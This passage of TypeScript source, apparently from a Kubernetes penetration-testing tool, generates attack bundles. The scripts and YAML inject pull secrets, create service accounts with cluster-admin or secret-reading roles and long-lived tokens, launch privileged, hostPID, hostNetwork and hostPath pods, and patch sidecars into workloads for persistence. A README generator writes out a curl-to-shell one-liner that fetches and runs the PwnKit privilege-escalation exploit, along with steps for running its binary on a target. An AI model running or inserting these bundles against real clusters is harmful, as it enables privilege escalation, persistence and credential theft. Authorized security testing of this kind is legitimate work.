  const ns = stringParam(context, "namespace", "default");
  const serviceAccount = stringParam(context, "serviceAccount", "default");
  const secretName = stringParam(context, "secretName", "kt-pull-secret");
  const dockerConfigJsonPath = stringParam(context, "dockerConfigJsonPath", "");
  const sourceLine = dockerConfigJsonPath
    ? `DOCKER_CONFIG_JSON=${sh(dockerConfigJsonPath)}`
    : `DOCKER_CONFIG_JSON="$(mktemp)"; printf '{"auths":{}}\\n' > "$DOCKER_CONFIG_JSON"`;
  return shellScript([
    `NS=${sh(ns)}`,
    `SA=${sh(serviceAccount)}`,
    `SECRET=${sh(secretName)}`,
    sourceLine,
    `kubectl create secret generic "$SECRET" -n "$NS" --type=kubernetes.io/dockerconfigjson --from-file=.dockerconfigjson="$DOCKER_CONFIG_JSON" --dry-run=client -o yaml | kubectl apply -f -`,
    `if kubectl get sa "$SA" -n "$NS" -o jsonpath='{.imagePullSecrets[*].name}' | tr ' ' '\\n' | grep -Fx "$SECRET" >/dev/null; then echo "ServiceAccount already references $SECRET"; exit 0; fi`,
    `if [ -n "$(kubectl get sa "$SA" -n "$NS" -o jsonpath='{.imagePullSecrets}' 2>/dev/null)" ]; then`,
    `  kubectl patch sa "$SA" -n "$NS" --type=json -p "[{\\"op\\":\\"add\\",\\"path\\":\\"/imagePullSecrets/-\\",\\"value\\":{\\"name\\":\\"$SECRET\\"}}]"`,
    `else`,
    `  kubectl patch sa "$SA" -n "$NS" --type=json -p "[{\\"op\\":\\"add\\",\\"path\\":\\"/imagePullSecrets\\",\\"value\\":[{\\"name\\":\\"$SECRET\\"}]}]"`,
    `fi`,
    `echo "patched ServiceAccount $NS/$SA with imagePullSecret $SECRET"`,
  ]);
}

function csrClientCertCleanupScript(context: RenderContext): string {
  const csrName = stringParam(context, "csrName", "kt-client-cert");
  const outputPrefix = stringParam(context, "outputPrefix", "kt-client-cert");
  return shellScript([
    `cd "$(dirname "$0")"`,
    `CSR_NAME=${sh(csrName)}`,
    `OUT=${sh(outputPrefix)}`,
    `kubectl delete csr "$CSR_NAME" --ignore-not-found=true`,
    `rm -f "$OUT.key" "$OUT.csr" "$OUT.csr.yaml" "$OUT.crt" "$OUT.ca.crt" "$OUT.kubeconfig"`,
  ]);
}

function pullSecretInjectionCleanupScript(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const serviceAccount = stringParam(context, "serviceAccount", "default");
  const secretName = stringParam(context, "secretName", "kt-pull-secret");
  return shellScript([
    `NS=${sh(ns)}`,
    `SA=${sh(serviceAccount)}`,
    `SECRET=${sh(secretName)}`,
    `INDEX="$(kubectl get sa "$SA" -n "$NS" -o jsonpath='{range .imagePullSecrets[*]}{.name}{"\\n"}{end}' 2>/dev/null | awk -v name="$SECRET" '$0 == name { print NR - 1; exit }')"`,
    `if [ -n "$INDEX" ]; then kubectl patch sa "$SA" -n "$NS" --type=json -p "[{\\"op\\":\\"remove\\",\\"path\\":\\"/imagePullSecrets/$INDEX\\"}]"; fi`,
    `kubectl delete secret "$SECRET" -n "$NS" --ignore-not-found=true`,
  ]);
}

function admissionPersistenceReviewScript(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "all");
  const nsFlag = ns === "all" ? "-A" : `-n ${sh(ns)}`;
  return shellScript([
    `echo "[kubetrail] admission persistence surface review"`,
    `kubectl auth can-i create mutatingwebhookconfigurations.admissionregistration.k8s.io`,
    `kubectl auth can-i patch mutatingwebhookconfigurations.admissionregistration.k8s.io`,
    `kubectl auth can-i create mutatingadmissionpolicies.admissionregistration.k8s.io 2>/dev/null || true`,
    `kubectl auth can-i create mutatingadmissionpolicybindings.admissionregistration.k8s.io 2>/dev/null || true`,
    `kubectl get ns --show-labels`,
    `kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations -o wide`,
    `kubectl get mutatingadmissionpolicies,mutatingadmissionpolicybindings,validatingadmissionpolicies,validatingadmissionpolicybindings 2>/dev/null || true`,
    `kubectl get pods ${nsFlag} -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" sa="}{.spec.serviceAccountName}{" images="}{.spec.containers[*].image}{"\\n"}{end}'`,
  ]);
}

function staticPodNodeReviewScript(context: RenderContext): string {
  const includeListing = boolParam(context, "includeFileListing", true);
  const listing = includeListing ? `  test -d "$path" && ls -la "$path" || true` : `  true`;
  return shellScript([
    `echo "[kubetrail] static pod manifest path review"`,
    `for root in / /host /hostroot; do`,
    `  for dir in /etc/kubernetes/manifests /etc/kubelet.d /var/lib/kubelet/manifests /etc/rancher/k3s/manifests /var/lib/rancher/k3s/server/manifests; do`,
    `    path="$root$dir"`,
    `    test "$root" = "/" && path="$dir"`,
    `    printf '\\n== %s ==\\n' "$path"`,
    `    stat "$path" 2>/dev/null || true`,
    listing,
    `  done`,
    `done`,
    `echo "[info] If writable static manifest paths are found, treat them as high-risk node-level persistence surface."`,
  ]);
}

function registryScript(context: RenderContext): string {
  const image = stringParam(context, "image", "<registry>/<repo>:<tag>");
  return shellScript([`IMAGE=${sh(image)}`, `docker manifest inspect "$IMAGE" >/dev/null && echo "manifest readable: $IMAGE"`]);
}

function genericKubectlReviewScript(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "all");
  const nsFlag = ns === "all" ? "-A" : `-n ${sh(ns)}`;
  const id = context.template.templateId;
  const commands: string[] = [`echo "[kubetrail] ${context.template.title}"`];
  if (id.includes("admission")) {
    commands.push(`kubectl get ns --show-labels`, `kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations`, `kubectl get constrainttemplates,constraints -A 2>/dev/null || true`, `kubectl get clusterpolicies,policies -A 2>/dev/null || true`);
  } else if (id.includes("controller") || id.includes("static-pod")) {
    commands.push(`kubectl get deploy,ds,sts,job,cronjob ${nsFlag} -o wide`, `kubectl get pods ${nsFlag} -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" owners="}{.metadata.ownerReferences[*].kind}{"/"}{.metadata.ownerReferences[*].name}{"\\n"}{end}'`);
  } else if (id.includes("image")) {
    commands.push(`kubectl get pods ${nsFlag} -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{"\\t"}{.spec.containers[*].image}{"\\n"}{end}'`, `kubectl get secrets ${nsFlag} --field-selector type=kubernetes.io/dockerconfigjson -o name 2>/dev/null || true`);
  } else if (id.includes("management")) {
    commands.push(`kubectl get svc,ingress ${nsFlag} -o wide`, `kubectl get pods ${nsFlag} -l 'app in (kubernetes-dashboard,argocd-server,rancher,kubeflow,grafana,prometheus)' -o wide 2>/dev/null || true`);
  } else if (id.includes("network") || id.includes("service-ingress")) {
    commands.push(`kubectl get networkpolicy ${nsFlag}`, `kubectl get svc,ingress,endpoints,endpointslices ${nsFlag} -o wide`);
  } else if (id.includes("operator")) {
    commands.push(`kubectl get crd`, `kubectl get deploy -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" sa="}{.spec.template.spec.serviceAccountName}{"\\n"}{end}'`, `kubectl get clusterrolebinding,rolebinding -A`);
  } else if (id.includes("observability")) {
    commands.push(`kubectl get events ${nsFlag} --sort-by=.lastTimestamp | tail -n 50`, `kubectl get pods -A -o wide | grep -Ei 'falco|tetragon|tracee|sysdig|defender|datadog|hubble|cilium' || true`);
  } else if (id.includes("resource")) {
    commands.push(`kubectl get resourcequota,limitrange,hpa,vpa ${nsFlag} 2>/dev/null || true`, `kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"\\t"}{.status.capacity.cpu}{" cpu\\t"}{.status.capacity.memory}{" mem\\t"}{.status.capacity.nvidia\\.com/gpu}{" gpu\\n"}{end}'`);
  } else if (id.includes("secret-material")) {
    commands.push(`kubectl get pods ${nsFlag} -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" sa="}{.spec.serviceAccountName}{" secrets="}{.spec.imagePullSecrets[*].name}{"\\n"}{end}'`, `kubectl get secrets ${nsFlag} -o name`);
  } else if (id.includes("windows")) {
    commands.push(`kubectl get nodes -l kubernetes.io/os=windows -o wide`, `kubectl get pods -A -o wide --field-selector spec.nodeName!= 2>/dev/null | grep -i windows || true`);
  } else {
    commands.push(`kubectl get pods,svc,ingress ${nsFlag} -o wide`);
  }
  return shellScript(commands);
}

function k8sApplyYaml(context: RenderContext): string {
  switch (context.template.templateId) {
    case "serviceaccount-rbac-persistence":
      return serviceAccountRbacYaml(context, false);
    case "pod-hostpath":
      return hostPathPodYaml(context);
    case "pod-privileged":
      return privilegedPodYaml(context);
    case "pod-hostpid":
      return hostPidPodYaml(context);
    case "pod-hostnetwork":
      return hostNetworkPodYaml(context);
    case "pod-create-job":
      return jobYaml(context);
    default:
      throw new Error(`No k8s-object renderer for ${context.template.templateId}`);
  }
}

function k8sCleanupYaml(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const name = stringParam(context, "name", defaultObjectName(context.template.templateId));
  if (context.template.templateId === "serviceaccount-rbac-persistence") {
    return serviceAccountRbacYaml(context, true);
  }
  if (context.template.templateId === "pod-create-job") {
    return minimalObjectYaml("batch/v1", "Job", ns, name);
  }
  return minimalObjectYaml("v1", "Pod", ns, name);
}

function serviceAccountRbacYaml(context: RenderContext, cleanup: boolean): string {
  const ns = stringParam(context, "namespace", "default");
  const name = stringParam(context, "name", "kt-scoped-sa");
  const scope = stringParam(context, "scope", "namespace").toLowerCase() === "cluster" ? "cluster" : "namespace";
  const roleName = stringParam(context, "roleName", `${name}-role`);
  const bindingName = stringParam(context, "bindingName", `${name}-binding`);
  const preset = stringParam(context, "preset", "secret-read");
  const createLongLivedToken = boolParam(context, "createLongLivedToken", false);
  const tokenSecretName = stringParam(context, "tokenSecretName", `${name}-token`);

  if (cleanup) {
    const objects = [
      scope === "cluster"
        ? clusterObjectYaml("rbac.authorization.k8s.io/v1", "ClusterRoleBinding", bindingName)
        : minimalObjectYaml("rbac.authorization.k8s.io/v1", "RoleBinding", ns, bindingName),
      scope === "cluster"
        ? clusterObjectYaml("rbac.authorization.k8s.io/v1", "ClusterRole", roleName)
        : minimalObjectYaml("rbac.authorization.k8s.io/v1", "Role", ns, roleName),
    ];
    if (createLongLivedToken) {
      objects.push(minimalObjectYaml("v1", "Secret", ns, tokenSecretName));
    }
    objects.push(minimalObjectYaml("v1", "ServiceAccount", ns, name));
    return objects.join("---\n");
  }

  const roleKind = scope === "cluster" ? "ClusterRole" : "Role";
  const bindingKind = scope === "cluster" ? "ClusterRoleBinding" : "RoleBinding";
  const roleHeader = scope === "cluster"
    ? clusterObjectHeader("rbac.authorization.k8s.io/v1", roleKind, roleName)
    : minimalObjectHeader("rbac.authorization.k8s.io/v1", roleKind, ns, roleName);
  const bindingHeader = scope === "cluster"
    ? clusterObjectHeader("rbac.authorization.k8s.io/v1", bindingKind, bindingName)
    : minimalObjectHeader("rbac.authorization.k8s.io/v1", bindingKind, ns, bindingName);
  const tokenSecret = createLongLivedToken ? [
    `---`,
    minimalObjectHeader("v1", "Secret", ns, tokenSecretName),
    `  annotations:`,
    `    kubernetes.io/service-account.name: ${yamlString(name)}`,
    `type: kubernetes.io/service-account-token`,
  ].join("\n") : "";

  return [
    minimalObjectHeader("v1", "ServiceAccount", ns, name),
    `---`,
    roleHeader,
    `rules:`,
    ...rbacPresetRules(preset, scope),
    `---`,
    bindingHeader,
    `subjects:`,
    `  - kind: ServiceAccount`,
    `    name: ${yamlString(name)}`,
    `    namespace: ${yamlString(ns)}`,
    `roleRef:`,
    `  apiGroup: rbac.authorization.k8s.io`,
    `  kind: ${roleKind}`,
    `  name: ${yamlString(roleName)}`,
    tokenSecret,
    ``,
  ].filter(Boolean).join("\n");
}

function hostPathPodYaml(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const name = stringParam(context, "name", "kt-hostpath-check");
  const image = stringParam(context, "image", "busybox:1.36");
  const targetPath = stringParam(context, "targetPath", "/var/run");
  const mountPath = stringParam(context, "mountPath", "/host");
  const hold = stringParam(context, "holdSeconds", "30");
  return [
    minimalObjectHeader("v1", "Pod", ns, name),
    `spec:`,
    serviceAccountLine(context),
    `  restartPolicy: Never`,
    `  containers:`,
    `    - name: check`,
    `      image: ${yamlString(image)}`,
    `      command: ["sh", "-c", "set -eu; echo hostPath mounted at ${mountPath}; ls -la ${mountPath} | head; sleep ${hold}"]`,
    `      securityContext:`,
    `        allowPrivilegeEscalation: false`,
    `      volumeMounts:`,
    `        - name: host-path`,
    `          mountPath: ${yamlString(mountPath)}`,
    `          readOnly: true`,
    `  volumes:`,
    `    - name: host-path`,
    `      hostPath:`,
    `        path: ${yamlString(targetPath)}`,
    `        type: Directory`,
    ``,
  ].filter(Boolean).join("\n");
}

function privilegedPodYaml(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const name = stringParam(context, "name", "kt-privileged-check");
  const image = stringParam(context, "image", "busybox:1.36");
  const hold = stringParam(context, "holdSeconds", "30");
  return [
    minimalObjectHeader("v1", "Pod", ns, name),
    `spec:`,
    serviceAccountLine(context),
    `  restartPolicy: Never`,
    `  containers:`,
    `    - name: check`,
    `      image: ${yamlString(image)}`,
    `      command: ["sh", "-c", "set -eu; id; grep Cap /proc/self/status; sleep ${hold}"]`,
    `      securityContext:`,
    `        privileged: true`,
    ``,
  ].filter(Boolean).join("\n");
}

function hostPidPodYaml(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const name = stringParam(context, "name", "kt-hostpid-check");
  const image = stringParam(context, "image", "busybox:1.36");
  const hold = stringParam(context, "holdSeconds", "30");
  return [
    minimalObjectHeader("v1", "Pod", ns, name),
    `spec:`,
    serviceAccountLine(context),
    `  hostPID: true`,
    `  restartPolicy: Never`,
    `  containers:`,
    `    - name: check`,
    `      image: ${yamlString(image)}`,
    `      command: ["sh", "-c", "set -eu; ps | head; sleep ${hold}"]`,
    ``,
  ].filter(Boolean).join("\n");
}

function hostNetworkPodYaml(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const name = stringParam(context, "name", "kt-hostnetwork-check");
  const image = stringParam(context, "image", "busybox:1.36");
  const hold = stringParam(context, "holdSeconds", "30");
  return [
    minimalObjectHeader("v1", "Pod", ns, name),
    `spec:`,
    serviceAccountLine(context),
    `  hostNetwork: true`,
    `  dnsPolicy: ClusterFirstWithHostNet`,
    `  restartPolicy: Never`,
    `  containers:`,
    `    - name: check`,
    `      image: ${yamlString(image)}`,
    `      command: ["sh", "-c", "set -eu; ip addr 2>/dev/null || ifconfig 2>/dev/null || true; sleep ${hold}"]`,
    ``,
  ].filter(Boolean).join("\n");
}

function jobYaml(context: RenderContext): string {
  const ns = stringParam(context, "namespace", "default");
  const name = stringParam(context, "name", "kt-job-check");
  const image = stringParam(context, "image", "busybox:1.36");
  const command = stringParam(context, "command", "id; uname -a");
  return [
    minimalObjectHeader("batch/v1", "Job", ns, name),
    `spec:`,
    `  ttlSecondsAfterFinished: 300`,
    `  template:`,
    `    metadata:`,
    `      labels:`,
    `        app.kubernetes.io/name: kubetrail-exp`,
    `    spec:`,
    serviceAccountLine(context, 6),
    `      restartPolicy: Never`,
    `      containers:`,
    `        - name: check`,
    `          image: ${yamlString(image)}`,
    `          command: ["sh", "-c", ${yamlString(command)}]`,
    ``,
  ].filter(Boolean).join("\n");
}

function ephemeralPatch(context: RenderContext, mode: "add-list" | "append"): unknown[] {
  const containerName = stringParam(context, "containerName", "kt-debug");
  const image = stringParam(context, "image", "busybox:1.36");
  const command = ["sh", "-c", "id; uname -a; sleep 30"];
  const value = { name: containerName, image, command, stdin: true, tty: true };
  if (mode === "append") {
    return [{ op: "add", path: "/spec/ephemeralContainers/-", value }];
  }
  return [{ op: "add", path: "/spec/ephemeralContainers", value: [value] }];
}

function workloadSidecarPatch(context: RenderContext): unknown[] {
  const containerName = stringParam(context, "containerName", "kt-sidecar");
  const image = stringParam(context, "image", "busybox:1.36");
  const command = stringParam(context, "command", "while true; do sleep 3600; done");
  return [
    {
      op: "add",
      path: "/spec/template/spec/containers/-",
      value: {
        name: containerName,
        image,
        command: ["sh", "-c", command],
        resources: {
          requests: { cpu: "25m", memory: "24Mi" },
          limits: { cpu: "50m", memory: "48Mi" },
        },
      },
    },
  ];
}

function runtimeSocketVerifierSource(): string {
  return `package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"time"
)

func main() {
	socket := flag.String("socket", "/run/containerd/containerd.sock", "Unix socket path to verify")
	dial := flag.Bool("dial", true, "attempt a non-mutating Unix socket dial")
	timeout := flag.Duration("timeout", 2*time.Second, "dial timeout")
	flag.Parse()

	info, err := os.Stat(*socket)
	if err != nil {
		fmt.Fprintf(os.Stderr, "stat failed: %v\\n", err)
		os.Exit(2)
	}
	fmt.Printf("path=%s mode=%s size=%d\\n", *socket, info.Mode().String(), info.Size())
	if info.Mode()&os.ModeSocket == 0 {
		fmt.Fprintf(os.Stderr, "not a Unix socket: %s\\n", *socket)
		os.Exit(3)
	}
	if !*dial {
		return
	}
	conn, err := net.DialTimeout("unix", *socket, *timeout)
	if err != nil {
		fmt.Fprintf(os.Stderr, "dial failed: %v\\n", err)
		os.Exit(4)
	}
	_ = conn.Close()
	fmt.Println("dial=ok")
}
`;
}

function renderReadme(context: RenderContext, rendered: RenderedArtifacts): string {
  const { template } = context;
  const extra = template.templateId === "cve-2021-4034-pwnkit" ? renderPwnKitReadmeExtra(context) : [];
  return [
    `# ${template.templateId}`,
    ``,
    template.summary,
    ``,
    `## Metadata`,
    ``,
    `- Kind: \`${template.kind}\``,
    `- Mode: \`${template.mode}\``,
    `- Run at: \`${template.runAt}\``,
    `- Finding IDs: ${context.findingIds.length ? context.findingIds.map((id) => `\`${id}\``).join(", ") : "(none)"}`,
    `- Evidence fact IDs: ${context.factIds.length ? context.factIds.map((id) => `\`${id}\``).join(", ") : "(none)"}`,
    `- Sensitive refs: ${context.sensitiveRefs.length ? context.sensitiveRefs.map((id) => `\`${id}\``).join(", ") : "(none)"}`,
    ``,
    `## Preconditions`,
    ``,
    ...template.preconditions.map((item) => `- ${item}`),
    ``,
    `## Side Effects`,
    ``,
    ...template.sideEffects.map((item) => `- ${item}`),
    ``,
    `## Parameters`,
    ``,
    "```json",
    JSON.stringify(context.params, null, 2),
    "```",
    ``,
    `## Run`,
    ``,
    ...rendered.runCommands.map((cmd) => `\`\`\`bash\n${cmd}\n\`\`\``),
    ...extra,
    ``,
    `## Cleanup`,
    ``,
    ...(rendered.cleanupCommands.length ? rendered.cleanupCommands.map((cmd) => `\`\`\`bash\n${cmd}\n\`\`\``) : ["No cleanup command is required for this bundle."]),
    ``,
  ].join("\n");
}

function renderPwnKitReadmeExtra(context: RenderContext): string[] {
  const binaryName = stringParam(context, "binaryName", "kt-pkexec-lpe");
  const command = stringParam(context, "command", "");
  const bundledBinaryPath = join(context.bundleDir, "bin", binaryName);
  return [
    ``,
    `## PwnKit Source And Usage`,
    ``,
    `This bundle is based on ly4k/PwnKit: https://github.com/ly4k/PwnKit`,
    ``,
    `If the authorized target can reach GitHub, the upstream one-liner is:`,
    ``,
    "```bash",
    `sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"`,
    "```",
    ``,
    `For offline targets, upload the generated binary and run it on the target:`,
    ``,
    `- Generated binary: \`${bundledBinaryPath}\``,
    ``,
    "```bash",
    `chmod +x /tmp/${binaryName}`,
    `/tmp/${binaryName} ${command ? sh(command) : ""}`.trim(),
    "```",
    ``,
    `Review \`USAGE-PWNKIT.md\`, \`asset-manifest.json\`, and \`src/source-manifest.json\` before operation.`,
  ];
}

function normalizeParams(template: ExpTemplate, params: Record<string, unknown>): Record<string, unknown> {
  return { ...(template.defaultParams ?? {}), ...params };
}

function stringParam(context: RenderContext, name: string, fallback: string): string {
  const value = context.params[name];
  if (value === undefined || value === null || value === "") {
    return fallback;
  }
  return String(value);
}

function boolParam(context: RenderContext, name: string, fallback: boolean): boolean {
  const value = context.params[name];
  if (value === undefined || value === null || value === "") {
    return fallback;
  }
  if (typeof value === "boolean") {
    return value;
  }
  return ["1", "true", "yes", "on"].includes(String(value).toLowerCase());
}

function defaultRunId(templateId: string): string {
  const stamp = new Date().toISOString().replace(/[-:]/g, "").replace(/\..+$/, "Z");
  return `${stamp}-${templateId}`;
}

function defaultObjectName(templateId: string): string {
  return `kt-${templateId.replace(/[^a-z0-9-]+/g, "-").slice(0, 40)}`;
}

function shellScript(lines: string[]): string {
  return ["#!/usr/bin/env bash", "set -euo pipefail", "", ...lines, ""].join("\n");
}

function sh(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function yamlString(value: string): string {
  return JSON.stringify(value);
}

function minimalObjectHeader(apiVersion: string, kind: string, namespace: string, name: string): string {
  return [
    `apiVersion: ${apiVersion}`,
    `kind: ${kind}`,
    `metadata:`,
    `  name: ${name}`,
    `  namespace: ${namespace}`,
    `  labels:`,
    `    app.kubernetes.io/name: kubetrail-exp`,
    `    app.kubernetes.io/managed-by: kubetrail-agent`,
  ].join("\n");
}

function minimalObjectYaml(apiVersion: string, kind: string, namespace: string, name: string): string {
  return `${minimalObjectHeader(apiVersion, kind, namespace, name)}\n`;
}

function clusterObjectHeader(apiVersion: string, kind: string, name: string): string {
  return [
    `apiVersion: ${apiVersion}`,
    `kind: ${kind}`,
    `metadata:`,
    `  name: ${name}`,
    `  labels:`,
    `    app.kubernetes.io/name: kubetrail-exp`,
    `    app.kubernetes.io/managed-by: kubetrail-agent`,
  ].join("\n");
}

function clusterObjectYaml(apiVersion: string, kind: string, name: string): string {
  return `${clusterObjectHeader(apiVersion, kind, name)}\n`;
}

function rbacPresetRules(preset: string, scope: "namespace" | "cluster"): string[] {
  switch (preset) {
    case "cluster-admin":
      return [
        `  - apiGroups: ["*"]`,
        `    resources: ["*"]`,
        `    verbs: ["*"]`,
        `  - nonResourceURLs: ["*"]`,
        `    verbs: ["*"]`,
      ];
    case "namespace-admin":
      return [
        `  - apiGroups: ["*"]`,
        `    resources: ["*"]`,
        `    verbs: ["*"]`,
      ];
    case "exec":
      return [
        `  - apiGroups: [""]`,
        `    resources: ["pods", "pods/exec", "pods/attach", "pods/log"]`,
        `    verbs: ["get", "list", "create"]`,
      ];
    case "workload-patch":
      return [
        `  - apiGroups: ["apps"]`,
        `    resources: ["deployments", "daemonsets", "statefulsets"]`,
        `    verbs: ["get", "list", "watch", "patch", "update"]`,
        `  - apiGroups: ["batch"]`,
        `    resources: ["jobs", "cronjobs"]`,
        `    verbs: ["get", "list", "watch", "patch", "update"]`,
      ];
    case "token-request":
      return [
        `  - apiGroups: [""]`,
        `    resources: ["serviceaccounts/token"]`,
        `    verbs: ["create"]`,
        `  - apiGroups: [""]`,
        `    resources: ["serviceaccounts"]`,
        `    verbs: ["get", "list"]`,
      ];
    case "secret-read":
    default:
      return [
        `  - apiGroups: [""]`,
        `    resources: ["secrets"]`,
        `    verbs: ["get", "list", "watch"]`,
        ...(scope === "cluster" ? [`  - apiGroups: [""]`, `    resources: ["namespaces"]`, `    verbs: ["get", "list"]`] : []),
      ];
  }
}

function normalizeWorkloadKind(value: string): string {
  const lowered = value.toLowerCase();
  if (["deployment", "deployments"].includes(lowered)) return "deployment";
  if (["daemonset", "daemonsets", "ds"].includes(lowered)) return "daemonset";
  if (["statefulset", "statefulsets", "sts"].includes(lowered)) return "statefulset";
  throw new Error(`unsupported workloadKind for sidecar patch: ${value}`);
}

function serviceAccountLine(context: RenderContext, indent = 2): string {
  const serviceAccount = stringParam(context, "serviceAccount", "");
  if (!serviceAccount) {
    return "";
  }
  return `${" ".repeat(indent)}serviceAccountName: ${serviceAccount}`;
}

function relativeFromApp(path: string): string {
  return path.startsWith(appRoot) ? path.slice(appRoot.length + 1) : path;
}
